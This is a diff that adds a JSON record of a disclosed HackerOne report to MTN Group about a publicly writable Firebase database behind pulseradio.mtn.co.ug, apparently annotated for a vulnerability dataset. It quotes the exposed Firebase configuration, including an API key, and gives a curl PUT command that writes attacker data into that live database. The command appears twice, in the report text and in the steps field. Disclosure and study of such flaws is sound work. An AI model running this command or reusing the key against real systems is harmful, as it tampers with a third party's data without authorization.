@@ -1,0 +1,38 @@
+{
+    "reported_to": "MTN Group",
+    "reported_by": "shuvam321 ",
+    "title": "Firebase Database Takeover in https://pulseradio.mtn.co.ug/",
+    "content": "\nSummary:\nDuring my test , in one of the subdomain of mtn.co.ug I found firebase configuration disclosed in the source code along with apiKey and database URL .\nExploiting this vulnerability attacker is able to upload malicious data in the firebase account of pulseradio.mtn.co.ug and see database over there .\nSteps To Reproduce:\nPOC : https://mtn-pulse-uganda.firebaseio.com/poc.json\nGo to URL below and view the source code of website .\nview-source:https://pulseradio.mtn.co.ug/wp-content/themes/mtn-pulse-reskin/zero-rate/firebase-config.js\nThere you will see following sensitive data .\n$(document).ready(function() {\n// Your web app's Firebase configuration\nvar firebaseConfig = {\napiKey: \"AIzaSyCRrABG3_Sc7xHar70hFyjHjEOJ071rbJ4\",\nauthDomain: \"mtn-pulse-uganda.firebaseapp.com\",\ndatabaseURL: \"https://mtn-pulse-uganda.firebaseio.com\",\nprojectId: \"mtn-pulse-uganda\",\nstorageBucket: \"mtn-pulse-uganda.appspot.com\",\nmessagingSenderId: \"242450689592\",\nappId: \"1:242450689592:web:bdd1173378d94d733800cd\",\nmeasurementId: \"G-KHPT64LJ5L\"\n};\nNow lets upload some data in firebase database . Send the following curl request . Your data will be uploaded to firebase .\ncurl \"https://mtn-pulse-uganda.firebaseio.com/poc1.json\" -XPUT -d '{\"attacker\":\"maliciousdata\"}'\nYour data will be uploaded to https://mtn-pulse-uganda.firebaseio.com/poc1.json\nReferences:\nThere are guidelines available by Firebase to resolve the insecurities and misconfiguration, please follow this link:\nhttps://firebase.google.com/docs/database/security/resolve-insecurities\nImpact\nThis is quite serious because by using this database attacker can use this for malicious purposes and also an attacker can track this database if mtn uses it for future perspective and at that time it will be much easier for the attacker to steal the data from this repository and later it will harm the reputation of the mtn.co.ug .\nSo please immediately change the rule of the database to private so that nobody can able to access it outside.\n\n",
+    "severity": [
+        10.0,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Insecure Storage of Sensitive Information"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1669909920,
+    "report_url": "https://hackerone.com/reports/1447751",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "LOW",
+    "vuln_category": "API",
+    "steps": [
+        [
+            1,
+            "Go to URL below and view the source code of website: view-source:https://pulseradio.mtn.co.ug/wp-content/themes/mtn-pulse-reskin/zero-rate/firebase-config.js"
+        ],
+        [
+            2,
+            "Send the following curl request to upload data to the Firebase database: curl \"https://mtn-pulse-uganda.firebaseio.com/poc1.json\" -XPUT -d '{\"attacker\":\"maliciousdata\"}'"
+        ]
+    ],
+    "vuln_description": "The vulnerability involves the exposure of Firebase configuration details, including API keys and database URLs, in the source code of the website. This allows an attacker to manipulate the Firebase database by uploading malicious data or accessing sensitive information without proper authentication.",
+    "reason": "The discovery of this vulnerability is straightforward as it only requires viewing the source code of the website to find the exposed Firebase configuration. The attack does not involve complex interactions or states, nor does it require novel logic. The steps to exploit the vulnerability are simple and direct.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
